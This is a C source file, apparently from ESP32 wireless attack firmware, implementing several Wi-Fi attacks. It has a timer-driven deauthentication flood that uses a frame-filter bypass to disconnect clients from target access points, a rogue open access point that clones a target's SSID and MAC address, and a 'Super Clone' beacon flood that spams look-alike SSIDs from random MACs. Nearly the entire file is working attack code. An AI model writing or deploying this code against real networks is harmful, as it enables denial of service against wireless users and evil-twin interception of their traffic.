/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 8-5-2026
 * @copyright Copyright (c) 2026
 *
 * @brief Implements common methods for various attacks.
 */

#include "attack_method.h"
#include "attack.h"
#include "esp_wifi.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "attack_method";

// Deauth timer
static void timer_send_deauth_frame(void *arg) {
    wifi_ap_record_t *ap = (wifi_ap_record_t *) arg;

    esp_err_t ch_err = esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
    if (ch_err != ESP_OK) {
        ESP_LOGV(TAG, "Channel set skip: %s", esp_err_to_name(ch_err));
        return;
    }

    wsl_bypasser_send_deauth_frame(ap);
}

static esp_timer_handle_t deauth_timer_handles[MAX_ATTACK_TARGETS];
static uint8_t active_timers = 0;

void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_sec) {
    esp_wifi_set_ps(WIFI_PS_NONE);
    if (active_timers >= MAX_ATTACK_TARGETS) {
        ESP_LOGW(TAG, "Max targets reached, skipping AP: %s", ap_record->ssid);
        return;
    }

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record,
        .name = "deauth_timer"
    };

    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handles[active_timers]));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handles[active_timers], 100000)); // 100ms

    active_timers++;
    ESP_LOGI(TAG, "Broadcast deauth started for BSSID: " MACSTR, MAC2STR(ap_record->bssid));
}

void attack_method_broadcast_stop() {
    for (int i = 0; i < active_timers; i++) {
        if (deauth_timer_handles[i]) {
            esp_timer_stop(deauth_timer_handles[i]);
            esp_timer_delete(deauth_timer_handles[i]);
            deauth_timer_handles[i] = NULL;
        }
    }
    active_timers = 0;
    ESP_LOGI(TAG, "All broadcast deauth timers stopped");
}

void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    ESP_LOGI(TAG, "Creating Rogue AP: %s", ap_record->ssid);
    wifictl_set_ap_mac(ap_record->bssid);
    
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = strlen((char *)ap_record->ssid),
            .channel = ap_record->primary,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
            .beacon_interval = 100
        },
    };
    memcpy(ap_config.ap.ssid, ap_record->ssid, 32);
    wifictl_ap_start(&ap_config);
    ESP_LOGI(TAG, "Rogue AP created on channel %d", ap_record->primary);
}

// Super Clone Attack
static const char *TAG_SC = "super_clone";
static bool sc_running = false;
static TaskHandle_t sc_task_handle = NULL;
static char target_ssid[33];
static uint8_t target_channel = 1;

#define MAX_CLONES 15
static uint8_t clone_mac_pool[MAX_CLONES][6];

static void generate_clone_mac_pool() {
    for (int i = 0; i < MAX_CLONES; i++) {
        for (int j = 0; j < 6; j++) {
            clone_mac_pool[i][j] = esp_random() & 0xFF;
        }
        clone_mac_pool[i][0] = (clone_mac_pool[i][0] & 0xFE) | 0x02; // Set local bit
    }
    ESP_LOGD(TAG_SC, "Generated %d clone MAC addresses", MAX_CLONES);
}

static void super_clone_task(void *pvParameters) {
    ESP_LOGI(TAG_SC, "Super Clone attack started on SSID: %s", target_ssid);
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

    while (sc_running) {
        for (int i = 0; i < MAX_CLONES; i++) {
            char fake_ssid[33];
            int base_len = strlen(target_ssid);

            if (base_len + i + 1 > 32) break;

            strncpy(fake_ssid, target_ssid, base_len);
            for (int s = 0; s < (i + 1); s++) {
                fake_ssid[base_len + s] = ' ';
            }
            fake_ssid[base_len + i + 1] = '\0';
            uint8_t ssid_len = strlen(fake_ssid);

            wsl_bypasser_send_beacon_frame(clone_mac_pool[i], (uint8_t *)fake_ssid, ssid_len, target_channel);
        }
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    sc_task_handle = NULL;
    vTaskDelete(NULL);
}

void attack_method_super_clone(const wifi_ap_record_t *ap_record) {
    if (sc_running) {
        ESP_LOGW(TAG_SC, "Super Clone already running");
        return;
    }
    if (ap_record == NULL) {
        ESP_LOGE(TAG_SC, "Invalid AP record");
        return;
    }

    strncpy(target_ssid, (char *)ap_record->ssid, 32);
    target_ssid[32] = '\0';
    target_channel = ap_record->primary;

    generate_clone_mac_pool();
    sc_running = true;
    xTaskCreate(super_clone_task, "super_clone", 4096, NULL, 5, &sc_task_handle);
    ESP_LOGI(TAG_SC, "Super Clone attack started for SSID: %s", target_ssid);
}

void attack_method_super_clone_stop(void) {
    if (!sc_running) return;
    
    sc_running = false;
    if (sc_task_handle) {
        vTaskDelay(pdMS_TO_TICKS(500));
        sc_task_handle = NULL;
    }
    ESP_LOGI(TAG_SC, "Super Clone attack stopped");
}